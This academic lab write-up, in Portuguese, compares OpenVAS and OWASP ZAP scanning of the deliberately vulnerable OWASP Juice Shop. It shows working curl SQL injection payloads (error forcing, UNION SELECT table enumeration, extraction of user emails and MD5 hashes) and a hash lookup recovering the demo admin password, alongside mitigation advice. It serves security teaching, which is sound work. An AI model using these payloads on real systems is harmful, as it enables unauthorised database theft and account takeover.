# Wiki Acadêmica — Laboratório de DAST com OWASP ZAP contra OWASP Juice Shop

**Tema:** comparação prática entre scanner de infraestrutura e scanner DAST em aplicação web vulnerável.  
**Ferramentas centrais:** Docker, OWASP Juice Shop, OWASP ZAP, curl e, opcionalmente, OpenVAS/Greenbone.  
**Finalidade:** documentação acadêmica para reprodução controlada dos testes realizados em laboratório.

> **Aviso de escopo e ética:** este roteiro deve ser executado exclusivamente em ambiente próprio, isolado e autorizado, utilizando aplicações vulneráveis por desenho, como OWASP Juice Shop. A reprodução destes procedimentos contra sistemas de terceiros, sem autorização expressa, é indevida e pode gerar responsabilização técnica, acadêmica, civil e criminal.

---

## 1. Objetivo do laboratório

Este laboratório tem por finalidade demonstrar, de forma técnica e reprodutível, a diferença entre:

1. **scanner de infraestrutura**, voltado à identificação de portas, serviços, versões, CVEs e falhas de configuração do sistema ou serviços expostos; e
2. **scanner DAST**, voltado à análise dinâmica da aplicação web, navegação, interação com parâmetros HTTP, descoberta de endpoints, testes de entrada e validação de vulnerabilidades em camada de aplicação.

No experimento, o OpenVAS/Greenbone apresentou retorno limitado contra o OWASP Juice Shop, enquanto o OWASP ZAP identificou alertas próprios de aplicação web, com destaque para **SQL Injection** no endpoint de busca de produtos.

---

## 2. Ambiente do laboratório

### 2.1. Componentes

| Componente | Função no laboratório |
|---|---|
| Host Linux | Servidor base para execução dos containers e testes via shell |
| Docker | Motor de containers utilizado para subir o alvo e a ferramenta DAST |
| OWASP Juice Shop | Aplicação vulnerável por desenho, utilizada como alvo controlado |
| OWASP ZAP | Scanner DAST utilizado para spidering, active scan e análise de alertas |
| curl | Ferramenta de linha de comando para validação manual das evidências |
| OpenVAS/Greenbone | Scanner de infraestrutura utilizado como comparação metodológica |

### 2.2. Topologia lógica

```text
[Analista]
    |
    | Browser / ZAP GUI / curl
    v
[Host Linux com Docker]
    |-- Container OWASP Juice Shop   -> porta 3000/tcp
    |-- Container OWASP ZAP          -> porta 8080/tcp, interface WebSwing
    |-- Opcional: OpenVAS/Greenbone  -> scanner de infraestrutura
```

### 2.3. Endereços utilizados no laboratório

No teste realizado, o Juice Shop foi acessado pelo endereço interno Docker:

```text
http://172.17.0.2:3000
```

Em outro ambiente, esse IP pode mudar. Para descobrir o IP do container:

```bash
docker ps

docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <nome_ou_id_do_container>
```

Também é possível publicar a aplicação na porta do host e utilizar o IP do servidor:

```text
http://<IP_DO_HOST>:3000
```

---

## 3. Preparação do ambiente

### 3.1. Criação de rede isolada para o laboratório

Recomenda-se o uso de uma rede Docker própria, a fim de manter o laboratório segregado e previsível:

```bash
docker network create lab-dast
```

### 3.2. Subida do OWASP Juice Shop

```bash
docker run -d \
  --name juice-shop \
  --network lab-dast \
  -p 3000:3000 \
  bkimminich/juice-shop
```

Validação inicial:

```bash
docker ps
curl -I http://127.0.0.1:3000
```

Resultado esperado:

```text
HTTP/1.1 200 OK
```

### 3.3. Subida do OWASP ZAP com interface WebSwing

Para uso em laboratório local, foi utilizada a imagem com interface gráfica via navegador:

```bash
docker run -u zap -d \
  --name zap \
  --network lab-dast \
  -p 8080:8080 \
  -p 8443:8443 \
  ghcr.io/zaproxy/zaproxy:full \
  zap-webswing.sh --webswing-disable-auth
```

Acesso à interface:

```text
http://<IP_DO_HOST>:8080/zap/
```

> Observação: o uso de `--webswing-disable-auth` é aceitável apenas em laboratório isolado. Em ambiente compartilhado, deve-se proteger a interface.

---

## 4. Comparação metodológica: OpenVAS x OWASP ZAP

### 4.1. Resultado esperado do OpenVAS/Greenbone

O OpenVAS/Greenbone é vocacionado à análise de infraestrutura. Seu foco natural recai sobre:

- portas expostas;
- banners de serviços;
- versões conhecidamente vulneráveis;
- problemas de TLS/SSL;
- configurações inseguras de serviços;
- CVEs de sistema operacional e componentes expostos.

No caso do OWASP Juice Shop, as vulnerabilidades mais relevantes estão na lógica da aplicação e nos endpoints de API. Por isso, o retorno do OpenVAS tende a ser inferior ao esperado quando o alvo é uma aplicação SPA moderna, baseada em JavaScript/Angular/Node.

### 4.2. Resultado esperado do OWASP ZAP

O OWASP ZAP, por ser DAST, atua de maneira mais aderente ao problema analisado. Ele permite:

- navegação automatizada com spider tradicional;
- navegação dinâmica com AJAX Spider;
- identificação de parâmetros HTTP;
- envio de payloads controlados;
- identificação de falhas de cabeçalhos;
- detecção de SQL Injection, XSS e outras vulnerabilidades web.

---

## 5. Configuração do scan no OWASP ZAP

### 5.1. Quick Start — Automated Scan

Na tela inicial do ZAP, preencher:

| Campo | Valor utilizado |
|---|---|
| URL to attack | `http://172.17.0.2:3000` ou `http://<IP_DO_HOST>:3000` |
| Scan Policy | `Dev Standard`, `Default Policy` ou política equivalente de laboratório |
| Use traditional spider | Marcado |
| Use ajax spider | `If Modern` ou habilitado |
| Browser | Firefox |

Evidência visual do setup:

![Tela de configuração do Automated Scan no OWASP ZAP](imagens/01-zap-quick-start.png)

### 5.2. Execução

Após clicar em **Attack**, o ZAP realiza as seguintes etapas:

1. spider tradicional para descoberta de recursos estáticos;
2. AJAX Spider para navegação em aplicação moderna;
3. active scan contra os endpoints e parâmetros identificados;
4. consolidação dos alertas na aba **Alerts**.

---

## 6. Vulnerabilidade identificada: SQL Injection

### 6.1. Alerta apresentado pelo ZAP

O ZAP identificou alerta de **SQL Injection** no seguinte recurso:

```text
URL: http://172.17.0.2:3000/rest/products/search?q=%27%28
Parâmetro: q
Risco: High
Confiança: Low
CWE: 89
WASC: 19
Evidência: HTTP/1.1 500 Internal Server Error
Fonte: Active Scan
Input Vector: URL Query String
```

Evidência visual do alerta:

![Alerta de SQL Injection no OWASP ZAP](imagens/02-zap-alert-sqli.png)

### 6.2. Interpretação técnica

O alerta indica que o parâmetro `q`, utilizado na busca de produtos, aceitou entrada malformada e produziu comportamento anômalo no backend. O retorno de erro SQL no servidor sugere ausência de tratamento adequado da entrada, com possibilidade de concatenação insegura de dados recebidos do usuário na consulta SQL.

---

## 7. Validação manual com curl

### 7.1. Teste inicial com aspa simples

Comando:

```bash
curl -i "http://172.17.0.2:3000/rest/products/search?q='"
```

Resultado observado:

```text
HTTP/1.1 200 OK
{"status":"success","data":[]}
```

Interpretação: a aspa simples isolada não foi suficiente para produzir erro no teste manual inicial, embora o ZAP tenha identificado comportamento suspeito em variações de payload.

### 7.2. Forçando erro de sintaxe SQL

Comando:

```bash
curl -i -G "http://172.17.0.2:3000/rest/products/search" \
  --data-urlencode "q=')));"
```

Resultado observado:

```text
HTTP/1.1 500 Internal Server Error
Error: SQLITE_ERROR: near ")": syntax error
OWASP Juice Shop (Express ^4.22.1)
```

Interpretação:

- a aplicação retornou erro interno;
- houve exposição de detalhe do banco SQLite;
- houve exposição da tecnologia backend Express;
- o erro reforça a hipótese de tratamento inadequado do parâmetro `q`.

---

## 8. Prova de conceito controlada: Union-Based SQL Injection

### 8.1. Enumeração de tabelas via `sqlite_master`

No SQLite, a enumeração de tabelas não é realizada por `SHOW TABLES`, como no MySQL, mas por consulta à tabela de metadados `sqlite_master`.

Comando utilizado:

```bash
curl -i -G "http://172.17.0.2:3000/rest/products/search" \
  --data-urlencode "q=')) UNION SELECT name, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master WHERE type='table'-- "
```

Resultado observado:

```text
HTTP/1.1 200 OK
```

Tabelas identificadas no retorno JSON:

| Tabela | Observação acadêmica |
|---|---|
| Users | Cadastro de usuários |
| Products | Produtos da loja |
| Baskets | Cestas/carrinhos |
| BasketItems | Itens de carrinho |
| Cards | Cartões fictícios da aplicação de teste |
| Wallets | Carteiras/saldos fictícios |
| SecurityAnswers | Respostas de segurança |
| SecurityQuestions | Perguntas de segurança |
| Feedbacks | Feedbacks da aplicação |
| Challenges | Desafios internos do Juice Shop |
| sqlite_sequence | Controle interno do SQLite |

### 8.2. Exfiltração acadêmica de dados da tabela `Users`

Comando utilizado em laboratório:

```bash
curl -i -G "http://172.17.0.2:3000/rest/products/search" \
  --data-urlencode "q=')) UNION SELECT email, password, '3', '4', '5', '6', '7', '8', '9' FROM Users-- "
```

Resultado observado:

```text
HTTP/1.1 200 OK
```

Exemplos de registros retornados:

| Campo projetado no JSON | Valor observado |
|---|---|
| id | `admin@juice-sh.op` |
| name | `0192023a7bbd73250516f069df18b500` |
| id | `jim@juice-sh.op` |
| name | `e541ca7ecf72b8d1286474fc613e5e45` |
| id | `bender@juice-sh.op` |
| name | `0c36e517e3fa95aabf1bbffc6744a4ef` |

Interpretação: a consulta manipulada permitiu projetar valores da tabela `Users` dentro do JSON originalmente destinado à busca de produtos. No contexto acadêmico, isso caracteriza demonstração controlada de exfiltração de dados via SQL Injection.


### 8.3. Validação acadêmica de hash MD5 com CrackStation

Após a extração controlada de registros da tabela `Users`, foi selecionado o hash associado ao usuário administrativo do laboratório para demonstrar o risco decorrente do uso de algoritmos de hash fracos, sem salt e sem fator de custo adequado.

> **Nota de escopo:** esta etapa foi realizada exclusivamente contra dados fictícios do OWASP Juice Shop, em ambiente controlado de ensino. Não se deve submeter hashes reais, corporativos, de clientes ou de terceiros em serviços públicos de consulta.

Serviço utilizado para lookup acadêmico:

```text
https://crackstation.net/
```

Hash submetido no laboratório:

```text
0192023a7bbd73250516f069df18b500
```

Resultado observado:

| Campo | Valor |
|---|---|
| Hash | `0192023a7bbd73250516f069df18b500` |
| Tipo identificado | `md5` |
| Resultado | `admin123` |

Evidência visual:

![Resultado do CrackStation para hash MD5 do laboratório](imagens/03-crackstation-md5-result.png)

Interpretação técnica: o resultado demonstra que o hash extraído em laboratório estava presente em base pré-computada de lookup, permitindo a recuperação imediata da senha correspondente. Em termos defensivos, a evidência reforça que MD5 não deve ser empregado para armazenamento de senhas, especialmente sem salt individual, sem pepper e sem algoritmo de derivação resistente a força bruta.

### 8.4. Encadeamento do impacto observado

O encadeamento do laboratório ficou demonstrado da seguinte forma:

```text
SQL Injection no parâmetro q
        ↓
Enumeração de tabelas via sqlite_master
        ↓
Identificação da tabela Users
        ↓
Extração controlada de e-mails e hashes
        ↓
Lookup do hash MD5 em base pública
        ↓
Recuperação da senha fraca do usuário administrativo fictício
```

Do ponto de vista acadêmico, a prova não se limita à existência abstrata de SQL Injection. Ela evidencia impacto concreto sobre confidencialidade, autenticação e governança de credenciais.

---

## 9. Achados complementares do OWASP ZAP

Além da SQL Injection, o ZAP apresentou alertas típicos de hardening de aplicação, tais como:

| Achado | Natureza | Impacto resumido |
|---|---|---|
| Content Security Policy Header Not Set | Configuração HTTP | Aumenta exposição a ataques de injeção de conteúdo e XSS |
| Missing Anti-clickjacking Header | Configuração HTTP | Pode permitir ataques de clickjacking |
| Cross-Domain Misconfiguration | Configuração HTTP/CORS | Pode ampliar superfície de interação indevida entre origens |
| Session ID in URL Rewrite | Sessão | Pode expor identificadores em histórico, logs e referers |
| Private IP Disclosure | Exposição de informação | Pode revelar detalhes internos do ambiente |
| X-Content-Type-Options Header Missing | Configuração HTTP | Pode permitir interpretação indevida de conteúdo |
| Modern Web Application | Informativo | Indica necessidade de spider dinâmico/AJAX |

---

## 10. Lições técnicas aprendidas

### 10.1. Sobre scanners de infraestrutura

Scanners como OpenVAS/Greenbone são essenciais para higiene de infraestrutura, porém não substituem testes DAST. Eles podem identificar falhas em serviços, versões e configurações, mas não necessariamente compreendem fluxos de aplicação, JavaScript, parâmetros dinâmicos e lógica de negócio.

### 10.2. Sobre scanners DAST

O OWASP ZAP mostrou-se mais adequado para o Juice Shop porque conseguiu interagir com a camada HTTP, descobrir o endpoint de busca e testar o parâmetro `q` com payloads voltados à aplicação.

### 10.3. Sobre validação manual

O alerta automatizado deve ser confirmado manualmente. O uso de `curl` permitiu:

- reproduzir erro HTTP 500;
- confirmar exposição de erro SQL;
- validar a possibilidade de `UNION SELECT`;
- demonstrar enumeração de tabelas;
- demonstrar acesso indevido a dados da tabela `Users` no ambiente controlado.

---

## 11. Recomendações de mitigação

### 11.1. Correções na aplicação

1. Substituir concatenação de strings SQL por **queries parametrizadas**.
2. Utilizar corretamente ORM ou query builder com binding de parâmetros.
3. Validar e normalizar entradas recebidas por parâmetros de busca.
4. Aplicar testes unitários e de integração para entradas maliciosas.
5. Impedir que erros técnicos sejam retornados ao cliente.
6. Não armazenar senhas com MD5, SHA-1 ou hashes rápidos equivalentes; utilizar algoritmos apropriados para senhas, como Argon2id, bcrypt ou scrypt, com salt individual e parâmetros de custo adequados.

### 11.2. Correções na infraestrutura

1. Habilitar WAF em modo monitoramento e, depois, bloqueio controlado.
2. Aplicar cabeçalhos de segurança: CSP, HSTS, X-Frame-Options ou frame-ancestors, X-Content-Type-Options.
3. Restringir exposição de serviços administrativos.
4. Centralizar logs de aplicação e proxy.
5. Criar alertas para padrões de ataque como `UNION SELECT`, aspas anômalas e erros SQL recorrentes.

### 11.3. Correções operacionais

1. Integrar DAST ao pipeline de CI/CD em ambiente de homologação.
2. Registrar evidências de scan em relatórios versionados.
3. Manter política de autorização formal para testes.
4. Diferenciar claramente teste de infraestrutura, teste DAST e validação manual.
5. Revisar falsos positivos e falsos negativos antes de concluir o relatório.

---

## 12. Roteiro resumido para reprodução

```bash
# 1. Criar rede de laboratório
docker network create lab-dast

# 2. Subir Juice Shop
docker run -d --name juice-shop --network lab-dast -p 3000:3000 bkimminich/juice-shop

# 3. Subir OWASP ZAP com interface WebSwing
docker run -u zap -d --name zap --network lab-dast \
  -p 8080:8080 -p 8443:8443 \
  ghcr.io/zaproxy/zaproxy:full \
  zap-webswing.sh --webswing-disable-auth

# 4. Acessar ZAP
# http://<IP_DO_HOST>:8080/zap/

# 5. Configurar Automated Scan
# URL: http://juice-shop:3000 ou http://<IP_DO_HOST>:3000
# Spider tradicional: habilitado
# AJAX Spider: If Modern/habilitado
# Browser: Firefox

# 6. Validar alerta SQLi via curl
curl -i -G "http://172.17.0.2:3000/rest/products/search" \
  --data-urlencode "q=')));"

# 7. Enumerar tabelas em ambiente controlado
curl -i -G "http://172.17.0.2:3000/rest/products/search" \
  --data-urlencode "q=')) UNION SELECT name, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master WHERE type='table'-- "
```

---

## 13. Evidências a anexar ao relatório acadêmico

| Evidência | Descrição | Status |
|---|---|---|
| Print 01 | Tela do Quick Start / Automated Scan do ZAP | Anexado |
| Print 02 | Aba Alerts com SQL Injection | Anexado |
| Print 03 | CrackStation identificando MD5 e retornando `admin123` | Anexado |
| Output 01 | `curl` com erro 500 e `SQLITE_ERROR` | Inserir no relatório final |
| Output 02 | `curl` com enumeração de tabelas | Inserir trecho relevante, sem excesso de dados |
| Output 03 | `curl` com projeção da tabela `Users` | Inserir apenas amostra acadêmica |
| Output 04 | Lookup acadêmico do hash MD5 no CrackStation | Inserir print e mascarar em relatório público, se necessário |
| Relatório ZAP | Exportação HTML/PDF do ZAP | Opcional |
| Logs Docker | `docker logs juice-shop` durante testes | Opcional |

---

## 14. Modelo de conclusão acadêmica

O laboratório demonstrou que a segurança de aplicações modernas exige abordagem em camadas. A análise de infraestrutura, embora indispensável, não foi suficiente para revelar vulnerabilidades de lógica presentes no OWASP Juice Shop. A utilização do OWASP ZAP, combinada com validação manual por `curl`, permitiu identificar e confirmar uma falha de SQL Injection no parâmetro `q` do endpoint `/rest/products/search`.

A exploração controlada permitiu comprovar erro SQL, enumeração de tabelas, projeção indevida de dados da tabela `Users` e posterior recuperação acadêmica de senha fraca por lookup de hash MD5, reforçando a necessidade de parametrização de consultas, tratamento adequado de erros, hardening HTTP, armazenamento seguro de credenciais e integração de testes DAST no ciclo de desenvolvimento. Assim, conclui-se que OpenVAS/Greenbone e OWASP ZAP são ferramentas complementares, cada qual com finalidade própria, devendo ser empregadas de modo coordenado em programas maduros de segurança.

---

## 15. Checklist final do aluno

- [ ] Subiu o Juice Shop em Docker.
- [ ] Subiu o OWASP ZAP em Docker.
- [ ] Confirmou conectividade entre ZAP e alvo.
- [ ] Executou Automated Scan.
- [ ] Identificou alerta de SQL Injection.
- [ ] Validou o alerta com `curl`.
- [ ] Registrou evidência do erro `SQLITE_ERROR`.
- [ ] Enumerou tabelas do SQLite em ambiente controlado.
- [ ] Documentou os achados complementares de hardening.
- [ ] Validou, em laboratório, o risco do hash MD5 com CrackStation.
- [ ] Redigiu conclusão técnica e recomendações.
- [ ] Anexou prints e outputs relevantes.

